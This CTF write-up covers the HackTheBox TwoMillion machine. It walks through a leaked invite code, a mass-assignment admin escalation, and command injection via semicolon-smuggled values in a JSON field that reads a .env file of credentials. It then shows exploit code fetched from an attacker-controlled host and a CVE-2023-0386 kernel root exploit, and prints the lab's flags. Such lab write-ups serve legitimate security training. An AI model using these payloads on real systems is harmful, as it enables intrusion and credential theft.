---
title: TwoMillion Write-Up
date: 2026-06-17
categories: [HackTheBox, Write-up]
tags: [web, linux, api, command-injection, cve-2023-0386, overlayfs]
author: Mohamad Helmi
description: "Invite code leak, mass-assignment, command injection, and a kernel OverlayFS exploit to root."
---

## TwoMillion (Web / Linux)
TwoMillion is a faithful recreation of the old HackTheBox invite-only registration portal. The attack chain runs from JavaScript-leaked invite logic through a mass-assignment vulnerability and command injection, then pivots to a kernel exploit to reach root.

### Enumeration

The box exposes two ports — SSH on 22 and nginx on 80. The web server redirects all traffic to `2million.htb`, so the hostname is added to `/etc/hosts` before continuing.

The site is a clone of HTB's original invite portal. Browsing to `/js/inviteapi.min.js` reveals obfuscated JavaScript that references an API endpoint for invite code generation. Deobfuscating the script — or simply calling the hint endpoint — returns a ROT13-encoded instruction pointing to `/api/v1/invite/generate`.

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate
# Decoded hint: POST to /api/v1/invite/generate

curl -s -X POST http://2million.htb/api/v1/invite/generate
# {"data":{"code":"<base64>","format":"encoded"}}

echo "<base64>" | base64 -d
# M495G-RF80H-32KHK-IOVVL
```

With a valid invite code, an account is registered and a session cookie captured via the login endpoint. The `password_confirmation` field is required or registration silently fails.

### API Enumeration

Authenticated requests to `/api/v1` return the full route listing. Among the user-facing endpoints are two admin routes that stand out:

- `PUT /api/v1/admin/settings/update` — update user settings
- `POST /api/v1/admin/vpn/generate` — generate a VPN config for a named user

Both are accessible without any admin check at the route level.

### Mass-Assignment — Privilege Escalation to Admin

The settings update endpoint accepts arbitrary JSON fields and writes them directly to the user record. Passing `"is_admin": 1` alongside the account email is enough to elevate the session to admin.

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"email":"pwner123@htb.com","is_admin":1}'
# {"id":13,"username":"pwner123","is_admin":1}
```

No server-side validation strips the `is_admin` field. The response immediately confirms the privilege change.

### Command Injection — RCE as www-data

The VPN generate endpoint passes the `username` field directly into a shell command without sanitisation. Appending a semicolon-delimited command confirms execution:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"username":"test;id;"}'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Credential Leak via .env

With RCE confirmed, reading `/var/www/html/.env` leaks database credentials stored in plaintext:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"username":"test;cat /var/www/html/.env;"}'
```

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

The password is reused for the system `admin` account. Since `www-data` can call `su`, the user flag is readable directly through the injection:

```bash
-d '{"username":"test;echo SuperDuperPass123 | su -s /bin/bash admin -c \"cat /home/admin/user.txt\";"}'
```

**user.txt:** `842e27473d41ed666c32e4c614bede7c`

### Privilege Escalation — CVE-2023-0386

An email in `/var/mail/admin` from `ch4p` urges patching the OS and specifically mentions OverlayFS/FUSE. The kernel is `5.15.70-051570-generic`, which is vulnerable to **CVE-2023-0386** — an OverlayFS SUID copy-up bug that allows an unprivileged user to obtain a SUID binary executing as root.

The exploit works in two parts: a FUSE filesystem serves a custom binary (`getshell`) as a SUID root file, and a second binary uses an OverlayFS namespace mount to copy that file into the upper layer, preserving the SUID bit despite the kernel's intended restrictions. The copied binary then executes as root.

Since the shell is non-interactive, `getshell.c` is modified before compiling to copy the root flag to `/tmp` rather than dropping to a shell:

```c
// system("/bin/bash");
system("cp /root/root.txt /tmp/r.txt && chmod 777 /tmp/r.txt");
```

The exploit source is compiled on the victim directly via the injection, using the box's own `gcc` and `libfuse-dev`:

```bash
mkdir -p /tmp/xpl && cd /tmp/xpl
wget http://<LHOST>:8000/fuse.c http://<LHOST>:8000/exp.c \
     http://<LHOST>:8000/getshell.c http://<LHOST>:8000/Makefile

export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/11/
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
```

Running the exploit mounts the FUSE filesystem, triggers the OverlayFS copy-up, and executes `gc` as root:

```bash
mkdir -p ovlcap/lower ovlcap/upper ovlcap/work ovlcap/merge test
./fuse ./ovlcap/lower ./gc &
sleep 4 && ./exp
```

**root.txt:** `ea540fd4b5f95bea240cb2bcabfef2ec`

### Key Takeaways

The first half of this box is entirely an API design failure: routes that should require admin are accessible to any authenticated user, and a mass-assignment vulnerability on the settings endpoint lets any user promote themselves. Neither requires any brute force or guessing — just reading the route listing and sending an extra JSON field.

The `.env` credential reuse is a common real-world pattern. Application service accounts routinely share passwords with system users, and a readable `.env` in the webroot is a direct path to lateral movement.

CVE-2023-0386 is notable because it abuses two Linux kernel features together — FUSE and OverlayFS — neither of which is misconfigured on its own. The vulnerability lies in how OverlayFS handles SUID bits during copy-up when the lower layer is a user-controlled FUSE mount. Patching requires a kernel update; there is no userspace mitigation.